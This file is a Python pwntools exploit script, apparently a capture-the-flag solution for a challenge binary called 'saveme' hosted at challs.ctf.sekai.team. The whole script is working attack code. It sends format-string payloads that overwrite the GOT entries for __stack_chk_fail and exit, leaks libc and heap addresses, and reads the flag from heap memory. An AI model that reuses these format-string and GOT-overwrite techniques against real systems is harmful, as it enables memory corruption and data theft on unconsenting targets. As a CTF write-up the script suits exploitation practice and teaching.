#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./saveme"
libc = ELF("./libc-2.31.so")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("challs.ctf.sekai.team", 4001)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        b *0x40151d
        b *0x401070
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


# recv gift
p.recvuntil("Here is your gift: ")
buf_addr = eval(p.recv(14))
log.info("buf@stack: " + hex(buf_addr))
canary_addr = buf_addr + 0x8 * 11
log.info("canary@stack: " + hex(canary_addr))
p.recvuntil(":")
p.sendline("2")

# call __stack_chk_fail(before exit) -> call exit -> exit@plt(before scanf) -> 0x4014e8(main)
## overwrite __stack_chk_fail@got -> 0x4013b8(before call exit)
payload = "%{}c%13$hn".format(0x13b8).encode()
## overwrite __stack_chk_fail@got -> 0x4014e8(before scanf)
payload += "%{}c%14$hn".format(0x131).encode()
## overwrite canary for call __stack_chk_fail
payload += b"%15$hhn"
## leak __libc_start_main+0xf3
payload += b"%21$p"
# padding
payload += b'A' * (8 - (len(payload) % 8))
payload += p64(elf.got['__stack_chk_fail'])
payload += p64(elf.got['exit'])
payload += p64(canary_addr+1)

p.recvuntil(":")
p.sendline(payload)

p.recvuntil(b"0x")
leak = eval(b"0x" + p.recv(12))
libc_base = leak - libc.symbols['__libc_start_main'] - 0xf3
log.info("libc base: " + hex(libc_base))
arena_base = libc_base + 0x1ecb80
log.info("arena_base: " + hex(arena_base))

payload = b"%11$s"
payload += b'B' * (8 - (len(payload) % 8))
payload += p64(arena_base + 8 * 2)

p.recvuntil(":")
p.sendline(payload)

p.recvuntil(b'\x20')
heap_leak = u32(p.recv(4))
log.info("heap leak: " + hex(heap_leak))
flag_addr = heap_leak - 0xbf0
log.info("flag@heap: " + hex(flag_addr))

payload = b"%13$s"
payload += b'C' * (8 - (len(payload) % 8))
payload += p64(flag_addr)

p.recvuntil(":")
p.sendline(payload)

p.interactive()
